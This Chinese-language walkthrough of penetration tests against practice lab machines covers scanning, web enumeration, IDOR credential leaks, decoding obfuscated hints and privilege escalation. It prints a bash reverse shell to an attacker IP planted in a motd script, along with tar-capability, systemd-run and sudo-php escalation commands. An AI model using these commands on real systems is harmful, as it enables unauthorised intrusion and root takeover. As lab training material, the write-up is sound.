但是由于查找到文件过多，需要进一步将无用的文件做过滤，对一些路径的文件进行过滤,发现motd文件是能够具有写权限，那么说明具有提权可能，而且还有一个类似提示的文件，并且还有一个密码文件。
find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/var/*"  2>/dev/null
```

![image-20250208020122316](靶场攻击1/image-20250208020122316.png)	

```
首先查看了密码文件，里面就是原先的yamdoot用户的密码凭据，于是查看这个文件，发现有一串乱码，但是打过CTF的话，就会知道这个其实就是brainfuck语言。
cat /mnt/hell.sh
```

![image-20250208020232564](靶场攻击1/image-20250208020232564.png)	

```
将这段乱码单独保存到一个文件，然后进行内容解析，感觉像是一串密码(chitragupt)
beef test.bf
```

![image-20250208020611073](靶场攻击1/image-20250208020611073.png)	

```
根据查看passwd的用户，对每个用户都使用这个密码依次尝试，发现inferno用户能够登录
ssh inferno@10.10.10.140
```

![image-20250208020737503](靶场攻击1/image-20250208020737503.png)	

```
发现并无能够执行的sudo命令。并且定时计划任务由于之前看过不行，所以也没用。
sudo -l
```

![image-20250208020806571](靶场攻击1/image-20250208020806571.png)	

```
于是寻找具有写权限的文件，发现motd具备可写权限。
```

![image-20250208020914307](靶场攻击1/image-20250208020914307.png)	

```
首先科普一下motd，motd是用于用户登录时或者ssh登陆会输出一些欢迎的内容，而这部分是通过motd设置的，而且motd具备执行权限，那如果在里面写入反弹shell，那么当重新登录时触发这个反弹shell，是不是意味着能获得root权限。而motd默认执行数字较小即优先级高的文件，于是对这个00-header文件中添加反弹shell,添加内容如下
bash -c "bash -i >& /dev/tcp/10.10.10.128/4444 0>&1" 
```

![image-20250208021311657](靶场攻击1/image-20250208021311657.png)	

```
kali重新建立监听,然后重新进行ssh登录触发motd执行，于是获得root权限。
nc -lvnp 4444
ssh inferno@10.10.10.140
```

![image-20250208021459682](靶场攻击1/image-20250208021459682.png)	

# CONNECT THE DOTS

```
扫描c段，确定靶机ip
nmap -sn 10.10.10.0/24  
```

![image-20250208184235109](靶场攻击1/image-20250208184235109.png)	

```
对靶机的ip进行端口扫描
nmap --min-rate 10000 -p- 10.10.10.142
```

![image-20250208184307154](靶场攻击1/image-20250208184307154.png)	

```
由于开放端口较多，对开放端口的内容保存到一个文件中。
nmap --min-rate 10000 -p- 10.10.10.142 |grep open > nmap.ports
将所有端口的信息过滤出来
cat nmap.ports | awk -F '/' '{print $1}'| tr '\n' ',' 
```

![image-20250208184544078](靶场攻击1/image-20250208184544078.png)	

![image-20250208184802577](靶场攻击1/image-20250208184802577.png)	

```
根据开放的端口检测服务版本以及操作系统信息,得知有ftp和http以及nfs服务开启。
nmap -sT -sV -O -p21,80,111,2049,7822,36401,36715,49649,55067 10.10.10.142
```

![image-20250208185107403](靶场攻击1/image-20250208185107403.png)	

```
接下来扫描UDP端口,并无发现能够渗透的端口。
nmap -sU --top-ports 20 10.10.10.142
```

![image-20250208191004533](靶场攻击1/image-20250208191004533.png)	

```
使用nmap脚本对开放的端口进行漏洞扫描，仅枚举出一些目录信息
nmap --script=vuln -p21,80,111,2049,7822,36401,36715,49649,55067 10.10.10.142
```

![image-20250208191436663](靶场攻击1/image-20250208191436663.png)	

```
由于ftp和nfs比较容易渗透，于是先访问ftp服务器,发现不允许匿名登陆，于是暂时放弃。
ftp 10.10.10.142
```

![image-20250208185558860](靶场攻击1/image-20250208185558860.png)	

```
于是查看nfs是否有共享目录,根据共享目录的名称可以得知存在一个morris用户
showmount -e 10.10.10.142
```

![image-20250208185820266](靶场攻击1/image-20250208185820266.png)	

```
新建一个目录，并挂载这个共享目录
mount -t nfs 10.10.10.142:/home/morris mo 
查看该目录所有的文件。
ls -liah
```

![image-20250208185939963](靶场攻击1/image-20250208185939963.png)	

```
根据一个个的文件查看，发现都没有权限，并无发现有效信息，于是nfs也渗透失败
```

![image-20250208190616552](靶场攻击1/image-20250208190616552.png)	

```
接下来只能对web进行渗透，首先访问网页，并无发现有效信息，查看源码也无发现有注释等提示信息。
```

![image-20250208191230932](靶场攻击1/image-20250208191230932.png)	

```
于是进行目录扫描
gobuster dir -u http://10.10.10.142/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
```

![image-20250208191806987](靶场攻击1/image-20250208191806987.png)	

```
根据扫描的路径，访问/backups里面只有一个视频，/mysite里面有很多文件，依次打开只有bootstrap.min.cs可能存在一些有效信息。
```

![image-20250208192108566](靶场攻击1/image-20250208192108566.png)	

```
首先这个文件的内容初次看可能会懵逼，但是实际上它就是由6个字符组成的jsfuck语言，可以用六个字符来表示javascript的逻辑，这是一种针对javascript程序的混淆方法。但这个语言是可以通过jsfuck解码来解析里面的内容的。所以首先需要把var以及双引号等无关字符清除掉，然后复制到网上的jsfuck解码来解析内容。
```

![image-20250208192549656](靶场攻击1/image-20250208192549656.png)	

```
将里面的内容复制到txt清除掉无用字符后，复制到jsfuck进行解析，里面解析出内容像是一串密码(TryToGuessThisNorris@2k19)
```

![image-20250208193402027](靶场攻击1/image-20250208193402027.png)	

```
根据这个密码尝试ssh登录root和morris失败，然后根据这个密码的提示内容去登录norris用户结果成功
ssh norris@10.10.10.142 -p 7822
```

![image-20250208193944909](靶场攻击1/image-20250208193944909.png)	

```
由于当前目录有ftp目录，于是可以对这个ftp里面的内容可以尝试渗透，发现里面存在几个文件
```

![image-20250208194016366](靶场攻击1/image-20250208194016366.png)	

![image-20250208194103903](靶场攻击1/image-20250208194103903.png)	

```
然后尝试这个账号和密码登录ftp服务器，发现是没问题的。
ftp 10.10.10.142
```

![image-20250208194252496](靶场攻击1/image-20250208194252496.png)	

```
设置二进制模式，便于下载文件不会出现问题
binary
设置无交互，这样下载文件不会出现交互信息
prompt
并把所有文件下载下来
mget *.*
```

![image-20250208194451825](靶场攻击1/image-20250208194451825.png)	

```
使用file分别查看各个文件，实际经过测试只有发现game.jpg.bak文件有问题，所以围绕这个文件展开。查看文件类型发现确实是jpeg格式。
file game.jpg.bak
```

![image-20250208194606923](靶场攻击1/image-20250208194606923.png)	

```
使用exiftool发现里面存在隐写的内容，看起来像是莫尔斯码
exiftool game.jpg.bak
```

![image-20250208194706222](靶场攻击1/image-20250208194706222.png)	

```
能够解析出一段英文。
```

![image-20250208195011272](靶场攻击1/image-20250208195011272.png)		

```
由于可读性较差，所以文本处理一下，这段话意思说他的电池很快就没电了，他就要ger~了，于是火速给我们留下一个信息，他把关键的信息secretfile放在了公共的区域。那啥是公共的区域呢？最容易想到的就是web的目录/var/www/html。
```

![image-20250208195210849](靶场攻击1/image-20250208195210849.png)		

```
当然也可以直接使用find查找这个文件,发现就在网站根目录
find / -iname "secretfile" 2>/dev/null
```

![image-20250208195427050](靶场攻击1/image-20250208195427050.png)	

```
进入到这个网站根目录，发现这个secretfile还有对应的swp后缀的交换文件。
```

![image-20250208195458616](靶场攻击1/image-20250208195458616.png)	

```
提示有密码信息，但是这个文件提示到一半就没了。那么只能查看对应的交换文件,但是发现权限不够。
cat secretfile
```

![image-20250208195543353](靶场攻击1/image-20250208195543353.png)	

![image-20250208195629386](靶场攻击1/image-20250208195629386.png)	

```
由于这个在网页端，那么没有权限就把这个文件下载到kali进行查看
wget http://10.10.10.142/.secretfile.swp
直接查看这个交换文件，看似好像也没有什么变化。
cat .secretfile.swp 
使用strings把关键字都分开来，发现里面有个类似vim的关键字。所以可以怀疑可能是用户在使用vim编辑的时候，异常退出而产生了这个对应的swp交换文件。
strings .secretfile.swp 
```

![image-20250208195906819](靶场攻击1/image-20250208195906819.png)	

![image-20250208200014029](靶场攻击1/image-20250208200014029.png)	

```
那么就使用vim查看这个交换文件的编辑的内容。于是这个提示信息里就显示了密码字段(blehguessme090)
vim -r .secretfile.swp
```

![image-20250208200153824](靶场攻击1/image-20250208200153824.png)	

```
使用该密码尝试登陆root失败，但是morris可以登录进去
ssh morris@10.10.10.142 -p 7822
```

![image-20250208200634702](靶场攻击1/image-20250208200634702.png)	

```
下一步就是进行提权了。两个用户用哪个提权都没有倾向性，因此根据用户组的信息，我们还是选用norris进行提权（起码norris所在用户组有sudo）
```

![image-20250208200747782](靶场攻击1/image-20250208200747782.png)	

```
经过一番sudo -l，定时任务查找之后无果，那么就用新的提权思路，决定使用getcap工具读取有没有文件具有特殊的文件能力。
/sbin/getcap -r / 2>/dev/null
```

![image-20250208201056936](靶场攻击1/image-20250208201056936.png)	

```
发现有打包工具tar，具有能力cap_dac_read_search+ep：
cap_dac_read_search 是一种 POSIX 文件能力，允许程序绕过文件的读权限检查以及目录的读/执行权限检查。具有该能力的程序可以读取系统中的任意文件，包括那些普通用户无法访问的文件（如 /etc/shadow 等敏感文件）。
+ep 表示该能力在程序的 有效集（Effective Set） 和 允许集（Permitted Set） 中都存在。
有效集（Effective Set）：表示程序实际使用的权限。
允许集（Permitted Set）：表示程序被允许使用的权限。
那么就可以玩骚操作了，直接用tar打包整个root目录
tar -zcvf root.tar.gz /root
```

![image-20250208201853058](靶场攻击1/image-20250208201853058.png)	

```
在解包即可得到root的flag文件。
tar -zxvf root.tar.gz
查看flag文件
cat root/root.txt 
```

​	![image-20250208202014372](靶场攻击1/image-20250208202014372.png)	

![image-20250208202039841](靶场攻击1/image-20250208202039841.png)	

```
但是实际渗透肯定获得root的shell才能学到东西，于是继续渗透，根据之前sudo和计划任务都没办法的情况下，那么就查找suid权限的文件,发现polkit-helper存在suid权限，那么就能用于提权了。
find / -perm -u=s -type f 2>/dev/null
```

![image-20250208202236236](靶场攻击1/image-20250208202236236.png)	

```
科普一下,polkit是linux系统中针对文件权限管理的一套机制，而helper相当于是充当一个介于操作者与被操作文件的一个中介，会通过这个helper去调用执行文件。因此如果我们能够借助helper的高权限，以root的身份调用bash，即可实现提权。而systemd可以运行的命令当作systemd服务，而使用systemd会触发执行polkit-helper，那么利用systemd开启伪终端，理论上就能通过polkit-helper执行获得root权限。
systemd-run -t /bin/bash
```

![image-20250208203044874](靶场攻击1/image-20250208203044874.png)	

# Me and My Girlfriend

```
扫描c段，确定靶机ip
nmap -sn 10.10.10.0/24
```

![image-20250208235353348](靶场攻击1/image-20250208235353348.png)	

```
对靶机的ip进行端口扫描
nmap --min-rate 10000 -p- 10.10.10.143
```

![image-20250208235420439](靶场攻击1/image-20250208235420439.png)	

```
对开放端口的服务版本和操作系统进行探测
nmap -sT -sC -sV -O -p22,80 10.10.10.143
```

![image-20250208235525571](靶场攻击1/image-20250208235525571.png)	

```
对靶机的UDP端口常见的20个端口进行扫描进行扫描
nmap -sU --top-ports 20 10.10.10.143
```

![image-20250208235543156](靶场攻击1/image-20250208235543156.png)	

```
使用nmap的漏洞脚本扫描开放端口是否有可利用漏洞
nmap --script=vuln -p22,80 10.10.10.143
```



```
那么根据优先级只能先访问网页，里面说这个网站只有本地才能够访问。
```

![image-20250208235638129](靶场攻击1/image-20250208235638129.png)	

```
查看站点源码，根据注释的提示，说要使用XFF，那么这里也就说明了只要我们用XFF指定为localhost，那么就能骗过靶机，让靶机认为我们是本地访问这个网页。
```

![image-20250208235724973](靶场攻击1/image-20250208235724973.png)	

```
除此之外也要先对网站进行目录爆破
gobuster dir -u http://10.10.10.143/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
```

![image-20250208235913646](靶场攻击1/image-20250208235913646.png)	

```
分别访问了/misc和/config，里面各自存放着一个php文件，但是访问里面是空白的，所以暂时无法利用。那么回到正题，只能使用bp设置XFF看能不能访问这个站点来得到新内容。由于要渗透一个站点，不可能每次都抓包添加XFF字段，这样太过麻烦，于是在proxy里面设置，一种添加这个XFF字段。
```

![image-20250209000117978](靶场攻击1/image-20250209000117978.png)	

```
添加这个内容，那么每次请求时都会带上XFF字段的信息
x-forwarded-for:localhost
```

![image-20250209000218876](靶场攻击1/image-20250209000218876.png)	

```
那么当每次访问这个网页的时候，抓包一定会添加xff这个字段的内容。
```

![image-20250209000337429](靶场攻击1/image-20250209000337429.png)	

```
接下来访问网页，发现确实有新的内容呈现出来
```

![image-20250209000423639](靶场攻击1/image-20250209000423639.png)	

```
由于登录的时候尝试万能密码失败，于是注册一个账号hsw
```

![image-20250209000504522](靶场攻击1/image-20250209000504522.png)	

```
登录进去后，点击profile，在里面改变user_id的值，会发现这个登录框和密码都会回显出其他的账号和密码。
```

![image-20250209000729177](靶场攻击1/image-20250209000729177.png)		

```
其中密码是可以通过f12查看到的。
```

![image-20250209013650077](靶场攻击1/image-20250209013650077.png)		

```
经过对每个用户的测试登录，只有alice用户是能够登陆的
ssh alice@10.10.10.143
那么接下来就是提权环节，由于查询sudo发现里面可以执行php
```

![image-20250209013837066](靶场攻击1/image-20250209013837066.png)	

```
那么提权就很简单了
sudo /usr/bin/php -r "system('/bin/bash');"
```

![image-20250209013942092](靶场攻击1/image-20250209013942092.png)	
